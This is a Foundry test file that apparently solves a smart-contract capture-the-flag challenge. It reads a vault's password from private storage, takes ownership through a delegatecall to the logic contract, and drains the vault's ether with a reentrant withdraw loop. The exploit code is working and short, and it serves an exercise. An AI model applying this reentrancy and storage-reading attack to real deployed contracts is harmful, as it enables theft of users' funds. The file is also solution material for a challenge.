// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attack {
    address payable public owner;
    Vault vault;

    constructor(address payable _vault) {
        owner = payable(msg.sender);
        vault = Vault(_vault);
    }

    function attack(bytes32 vault_logic) public payable {
        vault.deposite{value: msg.value}();
        VaultLogic(address(vault)).changeOwner(vault_logic, address(this));
        vault.openWithdraw();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0 && msg.sender != owner) {
            vault.withdraw();
        }
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);
    event Received(address Sender, uint Value);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        bytes32 password = vm.load(
            address(vault),
            0x0000000000000000000000000000000000000000000000000000000000000001
        );
        Attack attack = new Attack(payable(address(vault)));
        attack.attack{value: 0.1 ether}(password);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
